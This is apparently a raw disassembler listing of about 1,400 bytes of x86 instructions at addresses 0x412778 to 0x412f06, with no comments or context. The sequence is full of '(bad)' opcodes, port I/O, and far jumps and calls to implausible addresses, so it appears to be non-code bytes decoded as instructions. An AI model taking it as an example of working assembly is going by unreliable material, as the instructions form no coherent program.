  412778:	push   cs
  412779:	cdq    
  41277a:	les    esi,FWORD PTR [ebx-0x44]
  41277d:	int3   
  41277e:	js     0x4127c9
  412780:	add    al,0x35
  412782:	xor    WORD PTR [ebp+0x28],dx
  412786:	(bad)  [eax]
  412788:	inc    BYTE PTR [edi]
  41278a:	bound  eax,QWORD PTR [esi-0x62]
  41278d:	sbb    al,0xca
  41278f:	dec    edx
  412790:	or     DWORD PTR [ebx+0x2957823f],ecx
  412796:	sub    dh,al
  412798:	jno    0x41274a
  41279a:	xchg   BYTE PTR [edx+0x19],bl
  41279d:	(bad)  
  41279e:	cdq    
  41279f:	push   eax
  4127a0:	adc    dl,BYTE PTR [esi-0x5ef6206d]
  4127a6:	out    0x7b,al
  4127a8:	xchg   edi,eax
  4127a9:	cli    
  4127aa:	adc    BYTE PTR [esi-0xa],bh
  4127ad:	aam    0x2b
  4127af:	inc    esp
  4127b0:	jp     0x4127d4
  4127b2:	or     esp,DWORD PTR [edx]
  4127b4:	push   esp
  4127b5:	adc    al,0xa9
  4127b7:	push   0x9176e3ad
  4127bc:	bnd lock jo 0x412809
  4127c0:	adc    ah,BYTE PTR [edx+0x3cc4b3b0]
  4127c6:	jmp    0x412803
  4127c8:	add    eax,DWORD PTR [edx]
  4127ca:	adc    eax,0x8ce0d04b
  4127cf:	sbb    bl,ch
  4127d1:	sbb    cl,dl
  4127d3:	outs   dx,BYTE PTR ds:[esi]
  4127d4:	cs inc esi
  4127d6:	cvtdq2ps xmm7,XMMWORD PTR [edi]
  4127d9:	xor    dl,BYTE PTR [ebx]
  4127db:	add    cl,BYTE PTR [ebp+0x38022e3c]
  4127e1:	and    ebx,DWORD PTR [ebp-0x11497854]
  4127e7:	fadd   QWORD PTR [eax+ebp*1-0x16]
  4127eb:	call   0xa0d0:0x90545422
  4127f2:	in     eax,dx
  4127f3:	jg     0x4127f4
  4127f5:	cld    
  4127f6:	xchg   ebp,eax
  4127f7:	adc    edi,DWORD PTR [edx]
  4127f9:	jg     0x412814
  4127fb:	or     DWORD PTR [edi],eax
  4127fd:	push   edx
  4127fe:	inc    edi
  4127ff:	xchg   DWORD PTR [edx],edx
  412801:	xchg   ecx,eax
  412802:	stos   DWORD PTR es:[edi],eax
  412803:	stos   DWORD PTR es:[edi],eax
  412804:	(bad)  
  412805:	or     BYTE PTR [ecx],ch
  412807:	jbe    0x412887
  412809:	sub    DWORD PTR [edi],edi
  41280b:	popa   
  41280c:	ins    BYTE PTR es:[edi],dx
  41280d:	mov    esi,0x5cd13238
  412812:	in     eax,0x3f
  412814:	das    
  412815:	and    DWORD PTR [edx+ecx*1+0x682d5c78],esi
  41281c:	gs xchg esp,eax
  41281e:	xlat   BYTE PTR ds:[ebx]
  41281f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412820:	(bad)  
  412822:	test   BYTE PTR fs:[ebx-0x8],0xef
  412827:	arpl   WORD PTR [esi-0x40a57a71],cx
  41282d:	stc    
  41282e:	daa    
  41282f:	ret    
  412830:	xchg   ebx,eax
  412831:	cmp    esp,DWORD PTR [edx+0x6a]
  412834:	mov    ds:0x9f68d36c,eax
  412839:	icebp  
  41283a:	sbb    al,0xbd
  41283c:	ror    DWORD PTR [ecx],1
  41283e:	(bad)  
  41283f:	dec    ebx
  412840:	ja     0x412867
  412842:	dec    eax
  412843:	cmp    DWORD PTR [ecx-0xbf621d9],0xe2936ec4
  41284d:	lea    ebx,ds:0xb48ac160
  412853:	std    
  412854:	gs mov ebp,0x31edf10f
  41285a:	fisttp QWORD PTR [ebp+0x3b]
  41285d:	push   0x8
  41285f:	pop    esi
  412860:	loop   0x412873
  412862:	in     eax,dx
  412863:	inc    esp
  412864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412865:	sub    eax,0xfa60f6f7
  41286a:	push   edi
  41286b:	aad    0xa8
  41286d:	mov    ah,0xbf
  41286f:	int    0x22
  412871:	cwde   
  412872:	nop
  412873:	ret    0x1a38
  412876:	leave  
  412877:	outs   dx,BYTE PTR ds:[esi]
  412878:	fucomi st,st(7)
  41287a:	xor    ch,0x23
  41287d:	sub    eax,0x4cbf6f5c
  412882:	nop
  412883:	loope  0x412903
  412885:	ds inc esp
  412887:	out    0x7,al
  412889:	mov    cl,0xa5
  41288b:	(bad)  
  41288c:	shr    BYTE PTR [edi+0x414da68a],0x7
  412893:	jo     0xfc12153c
  412899:	lock xor bl,al
  41289c:	cmp    eax,0x33654ff6
  4128a1:	ins    DWORD PTR es:[edi],dx
  4128a2:	sbb    bh,dh
  4128a4:	int3   
  4128a5:	pop    ecx
  4128a6:	ficomp DWORD PTR [edi]
  4128a8:	std    
  4128a9:	xchg   ecx,eax
  4128aa:	out    dx,al
  4128ab:	stos   DWORD PTR es:[edi],eax
  4128ac:	sub    DWORD PTR [ebx-0x6e49eb59],esp
  4128b2:	sub    al,0xd5
  4128b4:	cdq    
  4128b5:	mov    esp,0x73340037
  4128ba:	xchg   ecx,eax
  4128bb:	sti    
  4128bc:	push   ss
  4128bd:	xchg   ebp,eax
  4128be:	xor    al,0x68
  4128c0:	fiadd  DWORD PTR [edi-0x2e]
  4128c3:	and    ecx,DWORD PTR [ebx+0x665a50bc]
  4128c9:	retf   0x530b
  4128cc:	dec    ecx
  4128cd:	inc    ecx
  4128ce:	sbb    dl,al
  4128d0:	gs das 
  4128d2:	scas   al,BYTE PTR es:[edi]
  4128d3:	data16 int 0x89
  4128d6:	test   ecx,edx
  4128d8:	pop    ss
  4128d9:	cmp    bh,BYTE PTR [esi]
  4128db:	jmp    0x979abaee
  4128e0:	sbb    DWORD PTR [ecx+esi*2+0x1ebb3e7a],edi
  4128e7:	add    bh,bh
  4128e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ea:	scas   eax,DWORD PTR es:[edi]
  4128eb:	popf   
  4128ec:	clc    
  4128ed:	mov    eax,0x3fd0a186
  4128f2:	xor    eax,0xfd6affd2
  4128f7:	outs   dx,DWORD PTR ds:[esi]
  4128f8:	push   esp
  4128f9:	shl    BYTE PTR [ebp-0xc7d7310],1
  4128ff:	mov    ah,0x2b
  412901:	retf   0x8857
  412904:	(bad)  
  412905:	mov    ch,0x88
  412907:	les    ebx,FWORD PTR gs:[ecx-0x32]
  41290b:	in     al,dx
  41290c:	pop    esi
  41290d:	mov    edi,0x57fcfe1d
  412912:	add    BYTE PTR [esi+0x1f95ea9],dl
  412918:	sbb    al,0xff
  41291a:	test   ebx,edi
  41291c:	ror    BYTE PTR [ebx+0x597182c7],cl
  412922:	(bad)  
  412923:	sub    bh,BYTE PTR [ebx]
  412925:	fldenv [edx]
  412927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412928:	xor    dl,BYTE PTR [esi+esi*4+0x2a242fab]
  41292f:	popf   
  412930:	mov    ds:0xbb3d2229,eax
  412935:	jne    0x41291e
  412937:	xor    BYTE PTR [eax-0x56427006],ah
  41293d:	(bad)  
  41293e:	clc    
  41293f:	fldenv [edx+eax*8+0x76]
  412943:	(bad)  
  412944:	(bad)  
  412945:	sbb    DWORD PTR [esi+0x7a71afdc],edx
  41294b:	(bad)  
  41294c:	sti    
  41294d:	xchg   BYTE PTR [esi],al
  41294f:	sbb    al,0x12
  412951:	sub    ah,BYTE PTR [edi-0x16c9c998]
  412957:	adc    edi,DWORD PTR [edx]
  412959:	push   esi
  41295a:	dec    ebp
  41295b:	mov    cl,0x41
  41295d:	std    
  41295e:	rcl    ebp,0x83
  412961:	xor    al,al
  412963:	cmc    
  412964:	fistp  WORD PTR [ebp+0x5d88d8ea]
  41296a:	in     eax,dx
  41296b:	cmp    al,0x7f
  41296d:	pop    eax
  41296e:	push   edi
  41296f:	pop    ds
  412970:	out    dx,eax
  412971:	mov    ss,WORD PTR [ebx-0x58131f6f]
  412977:	mov    esi,0x2db0bad0
  41297c:	mov    cl,0x63
  41297e:	call   0x9a6984dc
  412983:	jmp    0x252226bf
  412988:	xor    al,0x93
  41298a:	lds    ecx,FWORD PTR [ecx+0x7479a5d8]
  412990:	cs xchg ebp,eax
  412992:	pop    ecx
  412993:	shr    DWORD PTR [edx],cl
  412995:	or     ebp,esp
  412997:	adc    eax,0xe80a0971
  41299c:	jnp    0x4129df
  41299e:	mov    WORD PTR [eax],fs
  4129a0:	xchg   BYTE PTR [edx+ebx*1-0x753a2a0e],dh
  4129a7:	out    dx,eax
  4129a8:	cld    
  4129a9:	ins    BYTE PTR es:[edi],dx
  4129aa:	ins    DWORD PTR es:[edi],dx
  4129ab:	(bad)  
  4129ae:	jge    0x412946
  4129b0:	and    eax,0x9485e03b
  4129b5:	adc    eax,0x177a8389
  4129ba:	xor    eax,0x7ac5ebf4
  4129bf:	jbe    0x41296b
  4129c1:	adc    dl,bh
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	(bad)  
  4129c5:	shl    ch,cl
  4129c7:	add    dl,BYTE PTR [edi-0x56]
  4129ca:	jne    0x412a22
  4129cc:	adc    ebp,esi
  4129ce:	xor    al,0x84
  4129d0:	jg     0x412a2e
  4129d2:	ror    DWORD PTR [eax+0x16],0xc6
  4129d6:	gs aaa 
  4129d8:	aam    0x9e
  4129da:	cs xor eax,0x6a013374
  4129e0:	out    dx,eax
  4129e1:	inc    ebp
  4129e2:	pop    eax
  4129e3:	or     edx,eax
  4129e5:	cmp    eax,0x867381da
  4129ea:	in     al,0x4c
  4129ec:	inc    edi
  4129ed:	sub    bh,bl
  4129ef:	inc    ecx
  4129f0:	ja     0x4129f9
  4129f2:	mov    cl,0x20
  4129f4:	lock cmp DWORD PTR [eax-0x47],ebp
  4129f8:	leave  
  4129f9:	lods   eax,DWORD PTR ds:[esi]
  4129fa:	fsubr  st(2),st
  4129fc:	cli    
  4129fd:	call   DWORD PTR cs:[edi-0x2030fb2b]
  412a04:	daa    
  412a05:	sub    eax,DWORD PTR [edi-0x23]
  412a08:	sub    eax,0x71108004
  412a0d:	adc    ch,bh
  412a0f:	xor    al,0x91
  412a11:	enter  0x1e03,0xfb
  412a15:	call   0xf96:0x9cc85de4
  412a1c:	jecxz  0x412a45
  412a1e:	xchg   edx,eax
  412a1f:	sub    BYTE PTR [edx],al
  412a21:	sar    ah,0xa
  412a24:	dec    ebx
  412a25:	inc    eax
  412a26:	push   ds
  412a27:	retf   0x9629
  412a2a:	push   ebp
  412a2b:	psubusb mm7,mm4
  412a2e:	out    dx,al
  412a2f:	scas   eax,DWORD PTR es:[edi]
  412a30:	inc    esi
  412a31:	sti    
  412a32:	sbb    al,0x42
  412a34:	lahf   
  412a35:	daa    
  412a36:	mov    ebp,es
  412a38:	cmp    al,0xfd
  412a3a:	retf   
  412a3b:	cmp    dl,ch
  412a3d:	int3   
  412a3e:	sub    DWORD PTR [edi-0xf],eax
  412a41:	push   edx
  412a42:	pop    edi
  412a43:	out    dx,al
  412a44:	mov    fs:0x73b5a3a,al
  412a4a:	pop    ecx
  412a4b:	jbe    0x412abf
  412a4d:	(bad)
  412a50:	cli    
  412a51:	mov    bh,BYTE PTR [eax+0x18a90533]
  412a57:	push   eax
  412a58:	aas    
  412a59:	sub    al,0xcf
  412a5b:	jl     0x412a1c
  412a5d:	dec    ebx
  412a5e:	and    al,0x2
  412a60:	fwait
  412a61:	ds sti 
  412a63:	aas    
  412a64:	nop
  412a65:	mov    ebx,0xee43793d
  412a6a:	and    BYTE PTR es:[esi],dl
  412a6d:	lds    edi,FWORD PTR [ecx+0x4acd90fb]
  412a73:	xchg   ebx,eax
  412a74:	push   edx
  412a75:	cmc    
  412a76:	sub    BYTE PTR [ebp-0x768ec6c4],dl
  412a7c:	repz inc eax
  412a7e:	std    
  412a7f:	xor    al,0x5a
  412a81:	mov    edx,0x3c81d763
  412a86:	cwde   
  412a87:	ins    BYTE PTR es:[edi],dx
  412a88:	pop    eax
  412a89:	(bad)  
  412a8a:	out    0x46,eax
  412a8c:	daa    
  412a8d:	stos   BYTE PTR es:[edi],al
  412a8e:	dec    edi
  412a8f:	jmp    0x2057af43
  412a94:	jmp    0x15031a4a
  412a99:	jle    0x412a4f
  412a9b:	por    mm2,QWORD PTR ds:0x683c80d8
  412aa2:	push   eax
  412aa3:	loop   0x412ad5
  412aa5:	add    al,0x86
  412aa7:	dec    ecx
  412aa8:	enter  0xa5ae,0xa9
  412aac:	add    eax,0x44c13186
  412ab1:	mov    ah,0xb0
  412ab3:	enter  0x10bf,0x5
  412ab7:	pop    edi
  412ab8:	sub    esp,DWORD PTR [ecx-0x48]
  412abb:	ja     0x412ada
  412abd:	out    dx,eax
  412abe:	sbb    dl,dl
  412ac0:	mov    dl,0x41
  412ac2:	cld    
  412ac3:	inc    edi
  412ac4:	inc    edx
  412ac5:	ds add eax,0x11442c72
  412acb:	jnp    0x412ab8
  412acd:	mov    esp,0xb6535739
  412ad2:	scas   al,BYTE PTR es:[edi]
  412ad3:	mov    esp,0x53ed020b
  412ad8:	xor    dl,BYTE PTR [eax+0x7]
  412adb:	sbb    esi,edx
  412add:	scas   eax,DWORD PTR es:[edi]
  412ade:	add    ch,BYTE PTR ds:0x66f01acf
  412ae4:	iret   
  412ae5:	jne    0x412aef
  412ae7:	xor    BYTE PTR [edi],al
  412ae9:	(bad)  
  412aea:	mov    ebx,0xbf0ddbc
  412aef:	dec    ebx
  412af0:	mov    BYTE PTR [esp+ebp*4+0x74],ch
  412af4:	or     ah,BYTE PTR [esi-0xf]
  412af7:	pop    edi
  412af8:	sbb    bh,BYTE PTR [ebp-0x6d466fdf]
  412afe:	out    0x91,al
  412b00:	(bad)  
  412b01:	iret   
  412b02:	std    
  412b03:	loopne 0x412aa2
  412b05:	std    
  412b06:	mov    ah,0xac
  412b08:	(bad)
  412b0b:	stc    
  412b0c:	sub    dl,cl
  412b0e:	ret    0x7378
  412b11:	pop    ecx
  412b12:	xchg   DWORD PTR [esi-0x40],edi
  412b15:	shr    BYTE PTR [edx],cl
  412b17:	sbb    eax,0x4a689519
  412b1c:	es dec esp
  412b1e:	mov    bh,0x3
  412b20:	xchg   ebx,eax
  412b21:	push   edi
  412b22:	cmp    edi,DWORD PTR [edx+ebx*2-0x10cde7d2]
  412b29:	retf   
  412b2a:	pop    ss
  412b2b:	mov    eax,ds:0x3e2aeb8a
  412b30:	int3   
  412b31:	push   ss
  412b32:	pop    eax
  412b33:	stc    
  412b34:	lahf   
  412b35:	push   es
  412b36:	iret   
  412b37:	pushf  
  412b38:	inc    eax
  412b39:	fsub   DWORD PTR [edx]
  412b3b:	push   eax
  412b3c:	push   ecx
  412b3d:	cmp    ecx,DWORD PTR [ecx-0x4]
  412b40:	scas   eax,DWORD PTR es:[edi]
  412b41:	jo     0x412bbb
  412b43:	xchg   esi,eax
  412b44:	sub    DWORD PTR [ebx],esp
  412b46:	adc    BYTE PTR [ebx-0x38],0x0
  412b4a:	jp     0x412aef
  412b4c:	mov    esi,DWORD PTR [esi-0x62]
  412b4f:	add    eax,0xd4263c33
  412b54:	dec    ebx
  412b55:	aaa    
  412b56:	das    
  412b57:	inc    eax
  412b58:	dec    ebp
  412b59:	repnz mov ebx,0xece6c09f
  412b5f:	les    eax,FWORD PTR [edx+0x236efc9e]
  412b65:	int3   
  412b66:	pop    edx
  412b67:	mov    dl,0x5a
  412b69:	sub    eax,0xe5971f04
  412b6e:	cli    
  412b6f:	loopne 0x412b91
  412b71:	pop    esp
  412b72:	in     eax,dx
  412b73:	in     eax,dx
  412b74:	cmp    eax,0xf8e552a
  412b79:	fisttp DWORD PTR [edi]
  412b7b:	retf   0x19c3
  412b7e:	adc    dh,BYTE PTR [edi-0x186056d7]
  412b84:	and    DWORD PTR [eax-0x36],edx
  412b87:	adc    bl,al
  412b89:	adc    DWORD PTR [edi+0xb024dd5],eax
  412b8f:	and    al,0x95
  412b91:	lods   al,BYTE PTR ds:[esi]
  412b92:	sub    al,0xaa
  412b94:	leave  
  412b95:	jo     0x412b83
  412b97:	out    dx,eax
  412b98:	les    ebx,FWORD PTR [esi]
  412b9a:	sub    ebx,eax
  412b9c:	sar    BYTE PTR [edx+0x1a],0x97
  412ba0:	adc    esp,DWORD PTR [esi+eax*2+0x2ac6e217]
  412ba7:	sbb    DWORD PTR ds:0xd6c10611,eax
  412bad:	jmp    0x9ef5:0x7a0a65cf
  412bb4:	int    0x93
  412bb6:	and    al,0x3a
  412bb8:	sar    BYTE PTR [edx],0x66
  412bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbc:	icebp  
  412bbd:	(bad)  
  412bbe:	clc    
  412bbf:	daa    
  412bc0:	out    dx,eax
  412bc1:	mov    esp,edi
  412bc3:	in     eax,0x3
  412bc5:	fiadd  DWORD PTR [ecx-0x79e80c48]
  412bcb:	jmp    0x412bc5
  412bcd:	rcl    DWORD PTR [esi],1
  412bcf:	lods   eax,DWORD PTR ds:[esi]
  412bd0:	cli    
  412bd1:	icebp  
  412bd2:	cmp    DWORD PTR [edx+0x70cd7c25],eax
  412bd8:	dec    eax
  412bd9:	or     eax,DWORD PTR [edi-0x7b3c045d]
  412bdf:	mov    esp,0xf5bb2e39
  412be4:	dec    edx
  412be5:	xor    DWORD PTR es:[edi+edx*4],edx
  412be9:	jae    0x412baf
  412beb:	in     eax,dx
  412bec:	push   edx
  412bed:	test   eax,0x973889e1
  412bf2:	pop    ds
  412bf3:	xchg   ebx,eax
  412bf4:	popf   
  412bf5:	nop
  412bf6:	(bad)  
  412bf7:	and    DWORD PTR [edx+0x6acbba6e],edx
  412bfd:	cs mov bh,0x2a
  412c00:	out    0x85,al
  412c02:	lods   eax,DWORD PTR ds:[esi]
  412c03:	icebp  
  412c04:	cmp    BYTE PTR [esi+0x37],dh
  412c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c08:	ja     0x412c53
  412c0a:	jbe    0x412be9
  412c0c:	mov    ds:0xb4c6e30b,eax
  412c11:	rol    DWORD PTR ds:0x49ee5696,cl
  412c17:	mov    WORD PTR [ebx+0x79],?
  412c1a:	aam    0x1b
  412c1c:	xchg   ecx,eax
  412c1d:	ja     0x412bb5
  412c1f:	dec    ecx
  412c20:	jnp    0x412c4b
  412c22:	jmp    0xfc4ec5db
  412c27:	fld    TBYTE PTR [edi]
  412c29:	hlt    
  412c2a:	jnp    0x412bd0
  412c2c:	popf   
  412c2d:	cwde   
  412c2e:	in     al,0x3d
  412c30:	jb     0x412bbb
  412c32:	pop    eax
  412c33:	rcr    BYTE PTR ds:0xd3254fd8,0x5f
  412c3a:	jl     0x412c66
  412c3c:	pop    ecx
  412c3d:	aaa    
  412c3e:	(bad)  
  412c3f:	repnz ins DWORD PTR es:[edi],dx
  412c41:	dec    ebp
  412c42:	sub    al,0x8d
  412c44:	add    ecx,DWORD PTR [ebx]
  412c46:	jge    0x412bef
  412c48:	pop    esp
  412c49:	push   0xffffffe9
  412c4b:	xchg   ebp,eax
  412c4c:	jns    0x412c9c
  412c4e:	(bad)  
  412c4f:	(bad)  
  412c51:	xchg   BYTE PTR [ecx],bl
  412c53:	retf   
  412c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c55:	pop    eax
  412c56:	jne    0x412c4c
  412c58:	popf   
  412c59:	push   esi
  412c5a:	push   edi
  412c5b:	into   
  412c5c:	xor    DWORD PTR [ebp+0x1713aebb],ebp
  412c62:	xchg   ebp,eax
  412c63:	repnz dec edx
  412c65:	sub    ebx,ebx
  412c67:	dec    eax
  412c68:	scas   al,BYTE PTR es:[edi]
  412c69:	push   ecx
  412c6a:	sub    edi,DWORD PTR [ecx+0x69]
  412c6d:	xor    BYTE PTR [esp+ebp*4+0x2a],bl
  412c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c72:	call   0xc0a09dd2
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	adc    eax,0x74e9452d
  412c7d:	xchg   ebx,eax
  412c7e:	inc    esi
  412c7f:	icebp  
  412c80:	xchg   esp,edx
  412c82:	xor    eax,0xcc29595a
  412c87:	jb     0x412cad
  412c89:	fadd   DWORD PTR [edi+0x4]
  412c8c:	mov    WORD PTR [ecx-0x7d],?
  412c8f:	ja     0x412c1f
  412c91:	mov    DWORD PTR [ebp-0x29],eax
  412c94:	repz cmp edi,DWORD PTR [eax]
  412c97:	sbb    eax,0x416bb5d1
  412c9c:	lahf   
  412c9d:	cdq    
  412c9e:	stos   BYTE PTR es:[edi],al
  412c9f:	and    BYTE PTR [ebx-0x8],0xbf
  412ca3:	mov    al,0xc8
  412ca5:	push   cs
  412ca6:	test   DWORD PTR [ebx],esp
  412ca8:	sar    edx,1
  412caa:	or     DWORD PTR [edx-0x55bfb613],ebx
  412cb0:	es xor edx,edi
  412cb3:	jb     0x412ca6
  412cb5:	fnstsw WORD PTR [edi]
  412cb7:	jge    0x412d1f
  412cb9:	in     al,0x89
  412cbb:	xchg   ebp,eax
  412cbc:	push   esp
  412cbd:	(bad)  
  412cbe:	aad    0xf7
  412cc0:	xor    ebx,ebp
  412cc2:	ret    
  412cc3:	xlat   BYTE PTR ds:[ebx]
  412cc4:	arpl   si,di
  412cc6:	iret   
  412cc7:	pop    ecx
  412cc8:	mov    cl,dl
  412cca:	pop    eax
  412ccb:	add    esi,DWORD PTR [ebx+0x61]
  412cce:	outs   dx,DWORD PTR ds:[esi]
  412ccf:	xchg   ecx,eax
  412cd0:	pushf  
  412cd1:	pop    esp
  412cd2:	popa   
  412cd3:	iret   
  412cd4:	rol    DWORD PTR [ecx+0x7db91756],0xf7
  412cdb:	cmp    ebx,edx
  412cdd:	sub    eax,0xd9f620a0
  412ce2:	pop    eax
  412ce3:	loopne 0x412ca6
  412ce5:	adc    BYTE PTR [eax-0x719a7179],cl
  412ceb:	pop    ebx
  412cec:	xor    eax,0x949c49d7
  412cf1:	ror    esp,0x87
  412cf4:	iret   
  412cf5:	out    dx,al
  412cf6:	les    edi,FWORD PTR ds:0x70184c51
  412cfc:	pop    eax
  412cfd:	repz and DWORD PTR ds:0xc2bc4c49,0x5
  412d05:	call   0x215e:0xce3286f7
  412d0c:	dec    ebp
  412d0d:	dec    ebx
  412d0e:	js     0x412cc6
  412d10:	sbb    bl,dh
  412d12:	xor    al,BYTE PTR [eax-0x5c3e7b08]
  412d18:	cmp    cl,BYTE PTR [eax+ebx*4+0x750bbe21]
  412d1f:	sub    al,0x56
  412d21:	mov    ah,0x79
  412d23:	std    
  412d24:	mov    esi,0x2be49d14
  412d29:	cld    
  412d2a:	push   esi
  412d2b:	ins    BYTE PTR es:[edi],dx
  412d2c:	arpl   WORD PTR [ecx],di
  412d2e:	dec    ebp
  412d2f:	xchg   edi,eax
  412d31:	stos   DWORD PTR es:[edi],eax
  412d32:	popf   
  412d33:	mov    ds:0xdec22edb,al
  412d38:	call   0x5ce7:0x5cf9ec5b
  412d3f:	leave  
  412d40:	inc    esp
  412d41:	adc    al,0xfe
  412d44:	sbb    esp,DWORD PTR [ecx+0xf]
  412d47:	adc    edi,DWORD PTR [edi]
  412d49:	retf   
  412d4a:	ins    DWORD PTR es:[edi],dx
  412d4b:	test   BYTE PTR [ebx-0x3132d63],cl
  412d51:	cli    
  412d52:	(bad)  
  412d53:	retf   0x8fd7
  412d56:	dec    ebp
  412d57:	jno    0x412d8a
  412d59:	ins    BYTE PTR es:[edi],dx
  412d5a:	or     ch,BYTE PTR [edx]
  412d5c:	inc    edx
  412d5d:	jmp    0x1c32:0x7e62db96
  412d64:	inc    esi
  412d65:	gs loope 0x412cf9
  412d68:	sub    dh,dh
  412d6a:	cmp    ecx,DWORD PTR [esi]
  412d6c:	enter  0xb3bf,0x62
  412d70:	inc    edi
  412d71:	jnp    0x412dcd
  412d73:	ror    DWORD PTR [edx+0x7],0x85
  412d77:	sbb    al,0x13
  412d79:	mov    ebx,0x105d0e32
  412d7e:	cwde   
  412d7f:	jmp    0xde5e:0x8e061d7a
  412d86:	stc    
  412d87:	cmp    al,0xc
  412d89:	xor    BYTE PTR [edx-0x17],dh
  412d8c:	pushf  
  412d8d:	inc    esi
  412d8e:	aam    0x9
  412d90:	add    al,0xe6
  412d92:	imul   ebp,DWORD PTR [esi],0x6b0d6f74
  412d98:	push   ebx
  412d99:	inc    edx
  412d9a:	pop    edx
  412d9b:	mov    DWORD PTR [ebx+0x50274951],edx
  412da1:	lock xchg esi,eax
  412da3:	sub    edi,DWORD PTR [edx]
  412da5:	cdq    
  412da6:	rol    BYTE PTR [eax],0x3c
  412da9:	loop   0x412d9f
  412dab:	mov    edx,0xd3d30586
  412db0:	adc    eax,0x89a40dd
  412db5:	out    dx,al
  412db6:	adc    DWORD PTR [ebx-0x3cfcc1ef],esi
  412dbc:	dec    BYTE PTR [ebx+0x553f1113]
  412dc2:	sar    DWORD PTR [ecx+0xb0c5d13],0x15
  412dc9:	stos   DWORD PTR es:[edi],eax
  412dca:	jae    0x412db7
  412dcc:	mov    ch,0x7d
  412dce:	mov    cl,0xd1
  412dd0:	leave  
  412dd1:	rcr    BYTE PTR [bx+si-0x25],0x40
  412dd6:	sar    ah,cl
  412dd8:	fdiv   st(2),st
  412dda:	cmp    DWORD PTR [edi+0x52],ebx
  412ddd:	sbb    BYTE PTR ds:0x4fe80046,bh
  412de3:	inc    ebx
  412de4:	sti    
  412de5:	std    
  412de6:	(bad)  
  412de7:	mov    esi,DWORD PTR [ecx+0x7dcfceb1]
  412ded:	pop    eax
  412dee:	fneni(8087 only) 
  412df0:	arpl   WORD PTR [esi],di
  412df2:	sbb    DWORD PTR [ecx],ecx
  412df4:	push   edi
  412df5:	xor    BYTE PTR [eax-0x47],dh
  412df8:	mov    edi,0xc692d364
  412dfd:	rcr    bl,0xad
  412e00:	fs cli 
  412e02:	call   0xcde3:0x703ea0f
  412e09:	and    eax,0xb5b22183
  412e0e:	loop   0x412e56
  412e10:	xlat   BYTE PTR ds:[ebx]
  412e11:	aam    0xa7
  412e13:	test   BYTE PTR [ebp+0x1258d5d7],ah
  412e19:	repz leave 
  412e1b:	fstp   QWORD PTR [eax-0x39]
  412e1e:	mov    dl,0x32
  412e20:	mov    ch,0x3b
  412e22:	dec    ecx
  412e23:	test   BYTE PTR ds:0x77c5974d,0xd5
  412e2a:	cmp    ch,BYTE PTR [ebp-0x77e562ef]
  412e30:	cmp    DWORD PTR [eax],ecx
  412e32:	sub    dl,bl
  412e34:	ds xchg ecx,eax
  412e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e37:	jge    0x412e02
  412e39:	sbb    eax,DWORD PTR [ebx-0x1b7d0b6d]
  412e3f:	scas   eax,DWORD PTR es:[edi]
  412e40:	scas   eax,DWORD PTR es:[edi]
  412e41:	xor    ch,dh
  412e43:	jb     0x412dea
  412e45:	int3   
  412e46:	aas    
  412e47:	ficomp DWORD PTR [esi-0xd99a7d]
  412e4d:	dec    ebx
  412e4e:	pop    esp
  412e4f:	leave  
  412e50:	(bad)  
  412e51:	fadd   DWORD PTR [ebp-0x23]
  412e54:	cmp    esp,DWORD PTR [ebx+edx*4+0x6e684aab]
  412e5b:	jns    0x412ea2
  412e5d:	shr    BYTE PTR [eax+0x3d],0xcc
  412e61:	mov    fs,WORD PTR [edx]
  412e63:	mov    WORD PTR [esi],?
  412e65:	pop    eax
  412e66:	jmp    0xd930:0xe665de6f
  412e6d:	test   DWORD PTR [edi],0x4b184a58
  412e73:	pushf  
  412e74:	adc    BYTE PTR [eax],dl
  412e76:	mov    ah,0xf0
  412e78:	jnp    0x412eb9
  412e7a:	jb     0x412e39
  412e7c:	jmp    0x412e4a
  412e7e:	xor    eax,DWORD PTR [ebx]
  412e80:	push   cs
  412e81:	pop    ebx
  412e82:	cmp    al,0xb8
  412e84:	jae    0x412eef
  412e86:	aas    
  412e87:	js     0x412ee4
  412e89:	(bad)  
  412e8a:	jnp    0x412eb9
  412e8c:	xor    edi,DWORD PTR [eax+edx*2-0x24]
  412e90:	dec    ebx
  412e91:	nop
  412e92:	es cmp eax,0xaac9c837
  412e98:	push   edi
  412e99:	aaa    
  412e9a:	push   esp
  412e9b:	fild   QWORD PTR [ebx+0x7364d0f]
  412ea1:	jae    0x412e57
  412ea3:	inc    esp
  412ea4:	xchg   BYTE PTR [edx+0x2bafa0],dh
  412eaa:	xlat   BYTE PTR ds:[ebx]
  412eab:	or     al,0x1f
  412ead:	stc    
  412eae:	pop    esp
  412eaf:	add    cl,bl
  412eb1:	mov    ebx,0x67b9e0e9
  412eb6:	cld    
  412eb7:	mov    DWORD PTR [edx+0x77a31b6c],ebp
  412ebd:	and    al,0x5
  412ebf:	mov    edi,0x22446f34
  412ec4:	cmp    ch,BYTE PTR [ecx+0x4c]
  412ec7:	outs   dx,DWORD PTR ds:[esi]
  412ec8:	push   es
  412ec9:	adc    al,0x84
  412ecb:	push   esi
  412ecc:	int3   
  412ecd:	pop    edx
  412ece:	xor    esi,eax
  412ed0:	adc    eax,0xbebec9d6
  412ed5:	cmp    cl,BYTE PTR [edi-0x41]
  412ed8:	or     al,0xc7
  412eda:	dec    ebp
  412edb:	stc    
  412edc:	and    BYTE PTR [eax+eax*8-0x61],ch
  412ee0:	das    
  412ee1:	pop    edi
  412ee2:	out    dx,al
  412ee3:	mov    edi,0xdeff20d
  412ee8:	in     al,dx
  412ee9:	mov    al,0xec
  412eeb:	fsubr  QWORD PTR [ebx-0x51bd317e]
  412ef1:	in     eax,0xe2
  412ef3:	mov    al,0xa0
  412ef5:	not    DWORD PTR [ecx]
  412ef7:	(bad)  
  412ef8:	das    
  412ef9:	sub    BYTE PTR [ecx+esi*1-0x377926dd],ch
  412f00:	mov    dh,0xd9
  412f02:	add    al,0x4c
  412f04:	mov    cl,0xfd
  412f06:	out    dx,al
